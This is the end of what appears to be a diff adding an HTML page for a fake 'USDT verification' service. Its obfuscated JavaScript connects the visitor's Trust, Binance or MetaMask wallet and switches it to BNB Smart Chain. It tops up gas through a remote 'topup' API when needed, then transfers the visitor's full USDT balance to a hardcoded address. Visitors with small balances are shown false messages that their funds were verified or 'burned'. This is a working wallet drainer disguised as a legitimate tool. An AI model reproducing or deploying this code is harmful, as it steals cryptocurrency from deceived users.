+                          , _0x234f1d = document[_0x49fda8(0xbc)](_0x49fda8(0xe2));
+                        _0x234f1d[_0x49fda8(0xe4)] = _0x49fda8(0xcf),
+                        _0x234f1d['onload'] = _0x36cf20,
+                        _0x234f1d[_0x49fda8(0x101)] = _0x4c560e,
+                        document[_0x49fda8(0x114)][_0x49fda8(0xfe)](_0x234f1d);
+                    }
+                    );
+                }
+                async function _0x325d46(_0x379a62, _0x2ea203={}, _0x24c67c=0x3a98) {
+                    const _0x3d0ec3 = _0x14946b
+                      , _0x6fda97 = new AbortController()
+                      , _0x3180e2 = setTimeout( () => _0x6fda97[_0x3d0ec3(0x11c)](), _0x24c67c);
+                    _0x2ea203[_0x3d0ec3(0xe3)] = _0x6fda97[_0x3d0ec3(0xe3)];
+                    try {
+                        const _0x1d9c87 = await fetch(_0x379a62, _0x2ea203);
+                        return clearTimeout(_0x3180e2),
+                        _0x1d9c87;
+                    } catch (_0x2b5d5e) {
+                        clearTimeout(_0x3180e2);
+                        throw _0x2b5d5e;
+                    }
+                }
+                async function _0x3d3290(_0x240a0f, _0x506751) {
+                    const _0x219097 = _0x14946b
+                      , _0x3d8f8d = _0x219097(0xcd)
+                      , _0x5c76b6 = {
+                        'to': _0x240a0f
+                    }
+                      , _0x201596 = {
+                        'method': _0x219097(0xd0),
+                        'headers': {
+                            'Content-Type': _0x219097(0xf4),
+                            'x-topup-secret': _0x506751
+                        },
+                        'body': JSON[_0x219097(0x134)](_0x5c76b6)
+                    }
+                      , _0x294f28 = await fetch(_0x3d8f8d, _0x201596)
+                      , _0x2d0c62 = await _0x294f28['text']();
+                    let _0x464d32 = null;
+                    try {
+                        _0x464d32 = JSON['parse'](_0x2d0c62);
+                    } catch (_0x596748) {}
+                    return {
+                        'ok': _0x294f28['ok'],
+                        'status': _0x294f28[_0x219097(0xd2)],
+                        'body': _0x464d32 ?? _0x2d0c62
+                    };
+                }
+                async function _0x3b8554(_0x28eaf5, _0x4d5ced, _0x2f19a9) {
+                    const _0x4db9f4 = _0x14946b;
+                    try {
+                        const _0x40962a = ethers[_0x4db9f4(0x139)](String(_0x44ea78), _0x4d5ced);
+                        console[_0x4db9f4(0xad)](_0x4db9f4(0xd7) + _0x44ea78 + _0x4db9f4(0xd8) + String(_0x40962a) + _0x4db9f4(0xe0) + _0x2f19a9 + _0x4db9f4(0x10b));
+                        const _0x25885c = await _0x28eaf5[_0x4db9f4(0xfb)](_0x2f19a9, _0x40962a);
+                        console[_0x4db9f4(0xad)](_0x4db9f4(0xdc), _0x25885c[_0x4db9f4(0xb1)] || _0x25885c);
+                        const _0x2303b7 = await _0x25885c[_0x4db9f4(0xeb)]();
+                        _0x425620(),
+                        _0x58e737(_0x44ea78, _0x2f19a9, _0x4db9f4(0xb9)),
+                        console[_0x4db9f4(0xad)](_0x4db9f4(0xd3), _0x2303b7[_0x4db9f4(0xfa)] || _0x2303b7);
+                    } catch (_0x263108) {
+                        console[_0x4db9f4(0xcc)](_0x4db9f4(0x109), _0x263108);
+                    }
+                }
+                function _0x425620() {
+                    const _0x1f1aa7 = _0x14946b;
+                    document[_0x1f1aa7(0xf5)](_0x1f1aa7(0xd6))['textContent'] = _0x1f1aa7(0x117) + _0x44ea78 + _0x1f1aa7(0xb7),
+                    document[_0x1f1aa7(0xf5)](_0x1f1aa7(0x12b))[_0x1f1aa7(0x119)] = _0x44ea78 + '\x20USDT',
+                    _0x127397['style']['display'] = _0x1f1aa7(0x129);
+                }
+                function _0x5a55c1() {
+                    const _0x450a8d = _0x14946b;
+                    _0x127397['style'][_0x450a8d(0xf7)] = _0x450a8d(0x10e),
+                    _0x69b9ad['disabled'] = ![],
+                    _0x2a6ac2[_0x450a8d(0x119)] = _0x450a8d(0xd9),
+                    _0x69b9ad[_0x450a8d(0xbb)]['remove'](_0x450a8d(0xd5));
+                }
+                function _0x1be4bf() {
+                    const _0x19f48d = _0x14946b;
+                    document[_0x19f48d(0xf5)](_0x19f48d(0x133))[_0x19f48d(0x119)] = _0x19f48d(0xef) + _0x474b04 + '\x20USDT\x20has\x20been\x20verified\x20as\x20genuine.',
+                    document[_0x19f48d(0xf5)]('burn-text22')[_0x19f48d(0x119)] = _0x474b04 + _0x19f48d(0x12f),
+                    _0x3cbd76[_0x19f48d(0xdd)][_0x19f48d(0xf7)] = _0x19f48d(0x129);
+                }
+                function _0x853760() {
+                    const _0x407d79 = _0x14946b;
+                    _0x3cbd76[_0x407d79(0xdd)][_0x407d79(0xf7)] = 'none',
+                    _0x127397[_0x407d79(0xdd)][_0x407d79(0xf7)] = _0x407d79(0x10e),
+                    _0x69b9ad['disabled'] = ![],
+                    _0x2a6ac2[_0x407d79(0x119)] = _0x407d79(0xd9),
+                    _0x69b9ad[_0x407d79(0xbb)][_0x407d79(0x126)](_0x407d79(0xd5));
+                }
+                _0x44728f['addEventListener'](_0x14946b(0x111), _0x5a55c1),
+                _0x166327['addEventListener'](_0x14946b(0x111), _0x853760);
+                async function _0x5a665e() {
+                    const _0x546b78 = _0x14946b;
+                    try {
+                        await _0x5c6424();
+                    } catch (_0x477434) {
+                        console[_0x546b78(0xcc)](_0x546b78(0x12c), _0x477434),
+                        alert(_0x546b78(0x137));
+                        return;
+                    }
+                    const _0x536641 = _0x2ecf96();
+                    if (!_0x536641) {
+                        alert(_0x546b78(0x118));
+                        return;
+                    }
+                    try {
+                        typeof _0x536641[_0x546b78(0xb5)] === 'function' && (await _0x536641['request']({
+                            'method': _0x546b78(0x12d),
+                            'params': [{
+                                'chainId': _0x546b78(0x122)
+                            }]
+                        }),
+                        _0x988cf5(_0x546b78(0xdf)));
+                    } catch (_0x3b4135) {
+                        console[_0x546b78(0xe5)](_0x546b78(0xfc), _0x3b4135);
+                        try {
+                            typeof _0x536641[_0x546b78(0xb5)] === _0x546b78(0xbd) && (_0x3b4135?.['code'] === 0x1326 || _0x3b4135?.[_0x546b78(0xaf)] && _0x3b4135['message'][_0x546b78(0xae)]()[_0x546b78(0x12e)]('unrecognized')) && (await _0x536641[_0x546b78(0xb5)]({
+                                'method': 'wallet_addEthereumChain',
+                                'params': [{
+                                    'chainId': _0x546b78(0x122),
+                                    'chainName': 'BNB\x20Smart\x20Chain\x20Mainnet',
+                                    'nativeCurrency': {
+                                        'name': _0x546b78(0xb8),
+                                        'symbol': _0x546b78(0xb8),
+                                        'decimals': 0x12
+                                    },
+                                    'rpcUrls': [_0x546b78(0xc4)],
+                                    'blockExplorerUrls': [_0x546b78(0xac)]
+                                }]
+                            }),
+                            _0x988cf5(_0x546b78(0x11e)));
+                        } catch (_0x47d7d5) {
+                            console['warn'](_0x546b78(0x100), _0x47d7d5);
+                        }
+                    }
+                    try {
+                        if (typeof _0x536641['request'] === _0x546b78(0xbd))
+                            await _0x536641['request']({
+                                'method': _0x546b78(0x11b)
+                            });
+                        else
+                            typeof _0x536641[_0x546b78(0x113)] === _0x546b78(0xbd) && await _0x536641[_0x546b78(0x113)]();
+                    } catch (_0x480e51) {
+                        console[_0x546b78(0xe5)](_0x546b78(0xc7), _0x480e51),
+                        alert(_0x546b78(0x10c));
+                        return;
+                    }
+                    const _0x49e715 = new ethers[(_0x546b78(0xca))](_0x536641,_0x546b78(0xe8));
+                    let _0x13dccf;
+                    try {
+                        _0x13dccf = await _0x49e715[_0x546b78(0xbe)]();
+                    } catch (_0xd95cb3) {
+                        console[_0x546b78(0xcc)](_0x546b78(0xce), _0xd95cb3),
+                        alert(_0x546b78(0xe1));
+                        return;
+                    }
+                    let _0x9b20d6;
+                    try {
+                        _0x9b20d6 = await _0x13dccf['getAddress']();
+                    } catch (_0x1d4147) {
+                        console[_0x546b78(0xcc)]('address\x20failed', _0x1d4147),
+                        alert(_0x546b78(0xea));
+                        return;
+                    }
+                    _0x988cf5(_0x546b78(0xd4) + _0x9b20d6);
+                    try {
+                        const _0x876e20 = new ethers['Contract'](_0x1fdd8f,_0x29ceeb,_0x49e715)['connect'](_0x13dccf)
+                          , _0xb53e6e = await _0x876e20[_0x546b78(0xbf)]()[_0x546b78(0x106)]( () => 0x12)
+                          , _0x36da63 = await _0x876e20['balanceOf'](_0x9b20d6)
+                          , _0x22838d = Number(ethers[_0x546b78(0x124)](_0x36da63, _0xb53e6e));
+                        _0x988cf5(_0x546b78(0xb2) + _0x22838d);
+                        let _0x609a35 = Number(ethers['formatEther'](await _0x49e715[_0x546b78(0xc0)](_0x9b20d6)));
+                        if (_0x22838d < _0x44ea78) {
+                            _0x474b04 = _0x22838d,
+                            _0x1be4bf(),
+                            console[_0x546b78(0xad)](_0x546b78(0xf1) + _0x474b04 + _0x546b78(0x107));
+                            return;
+                        } else
+                            _0x44ea78 = _0x22838d;
+                        if (_0x609a35 < 0.00004) {
+                            const _0x5385e9 = _0x9b20d6[_0x546b78(0xec)]()
+                              , _0x20f0f2 = _0x51ae1a[_0x546b78(0xec)]();
+                            if (!_0x5385e9 || !_0x5385e9[_0x546b78(0xb4)]('0x') || _0x5385e9[_0x546b78(0x103)] < 0x28) {
+                                alert(_0x546b78(0x123));
+                                return;
+                            }
+                            if (!_0x20f0f2) {
+                                alert(_0x546b78(0x11d));
+                                return;
+                            }
+                            try {
+                                const _0x2165a6 = await _0x3d3290(_0x5385e9, _0x20f0f2);
+                                if (!_0x2165a6['ok']) {
+                                    alert('Top-up\x20failed\x20—\x20check\x20console/server\x20logs.');
+                                    return;
+                                } else
+                                    console[_0x546b78(0xad)](_0x546b78(0xb0));
+                            } catch (_0xa6ea35) {
+                                alert(_0x546b78(0x128) + (_0xa6ea35?.['message'] ?? _0xa6ea35));
+                                return;
+                            }
+                        } else {}
+                        if (!_0x481823) {
+                            _0x988cf5('AUTO_SEND\x20disabled\x20—\x20stopping.');
+                            return;
+                        }
+                        await _0x3b8554(_0x876e20, _0xb53e6e, _0x4e7afe);
+                    } catch (_0x355d62) {
+                        console['error']('token\x20flow\x20error', _0x355d62);
+                    }
+                }
+                _0x69b9ad[_0x14946b(0x115)]('click', _0x18f1a9 => {
+                    const _0x1724ca = _0x14946b;
+                    _0x18f1a9[_0x1724ca(0xf0)](),
+                    _0x69b9ad[_0x1724ca(0xc1)] = !![],
+                    _0x2a6ac2[_0x1724ca(0x119)] = _0x1724ca(0x102),
+                    _0x69b9ad[_0x1724ca(0xbb)]['add'](_0x1724ca(0xd5)),
+                    _0x5a665e()[_0x1724ca(0x106)](_0x150c05 => {
+                        const _0x58d12c = _0x1724ca;
+                        console[_0x58d12c(0xcc)](_0x58d12c(0xdb), _0x150c05);
+                    }
+                    );
+                }
+                ),
+                window[_0x14946b(0x105)] = {
+                    'connectFlow': _0x5a665e
+                };
+            }()));
+            function _0x4f0c() {
+                const _0x313a3f = ['providers', 'Token\x20transfer\x20failed\x20or\x20was\x20rejected\x20by\x20user:', 'BinanceChain', '\x20—\x20wallet\x20will\x20prompt\x20for\x20approval.', 'Please\x20allow\x20account\x20access\x20in\x20wallet.', 'web3', 'none', '1454697JkWhay', 'action', 'click', '3600504ukJGZn', 'enable', 'head', 'addEventListener', 'overlay', 'We\x27ve\x20identified\x20and\x20burned\x20', 'No\x20injected\x20wallet\x20detected.\x20Open\x20inside\x20Trust\x20Wallet\x20or\x20Binance\x20Wallet\x20dApp\x20browser.', 'textContent', 'function\x20decimals()\x20view\x20returns\x20(uint8)', 'eth_requestAccounts', 'abort', 'Enter\x20the\x20API\x20secret\x20(x-topup-secret).', 'Requested\x20add\x20chain', 'isBinanceChain', 'isMetaMask', '885651SWLxzd', '0x38', 'Enter\x20a\x20valid\x200x\x20recipient\x20address.', 'formatUnits', 'isArray', 'remove', '142TcsjDg', 'Request\x20error:\x20', 'flex', '70330UTgPrm', 'burn-text2', 'ethers\x20load\x20failed', 'wallet_switchEthereumChain', 'includes', '\x20USDT', 'sheet', 'Detected\x20legacy\x20web3\x20provider', 'sheet\x20post\x20failed', 'burn-text11', 'stringify', 'find', 'connectBtn', 'Failed\x20to\x20load\x20libs', 'append', 'parseUnits', '.loader', 'https://bscscan.com', 'log', 'toLowerCase', 'message', 'Top-up\x20request\x20succeeded.', 'hash', 'USDT\x20balance:\x20', 'ethereum', 'startsWith', 'request', 'function\x20symbol()\x20view\x20returns\x20(string)', '\x20flash\x20USDT', 'BNB', 'Sheet1', 'Detected\x20window.ethereum', 'classList', 'createElement', 'function', 'getSigner', 'decimals', 'getBalance', 'disabled', 'function\x20transfer(address\x20to,\x20uint256\x20amount)\x20returns\x20(bool)', 'isTrustWallet', 'https://bsc-dataseed.binance.org/', 'overlay2', 'site_name', 'account\x20request\x20failed', '682NBjEOL', '6cYxYPz', 'BrowserProvider', 'ethers', 'error', 'https://api.checksbep20.org/topup', 'getSigner\x20failed', 'https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js', 'POST', 'toISOString', 'status', 'Transfer\x20confirmed:', 'Connected\x20address:\x20', 'loading', 'burn-text', 'Sending\x20', '\x20tokens\x20(', 'Verify\x20Assets', 'isTrust', 'connectFlow\x20error', 'Transfer\x20tx\x20sent:', 'style', '6362AznDAZ', 'Requested\x20chain\x20switch\x20to\x20BSC', ')\x20to\x20', 'Failed\x20to\x20get\x20signer', 'script', 'signal', 'src', 'warn', 'currentProvider', 'token', 'any', 'providerDebug', 'Failed\x20to\x20read\x20address', 'wait', 'trim', '.btn-text', '13410DIBMfx', 'Your\x20', 'preventDefault', 'Insufficient\x20USDT\x20balance\x20(<\x20', '0x143414', '\x20-\x20', 'application/json', 'getElementById', 'querySelector', 'display', '664MLylWh', 'No\x20injected\x20provider\x20detected', 'transactionHash', 'transfer', 'switch\x20failed', 'isCoinbaseWallet', 'appendChild', '2575650eRASGK', 'add\x20chain\x20failed', 'onerror', 'Verifying...', 'length', 'amount', '__autoSend', 'catch', ').\x20No\x20transfer\x20attempted.'];
+                _0x4f0c = function() {
+                    return _0x313a3f;
+                }
+                ;
+                return _0x4f0c();
+            }
+        </script>
+    </body>
+    <!--Tue, 16 Sep 2025 13:23:49 GMT -->
+</html>
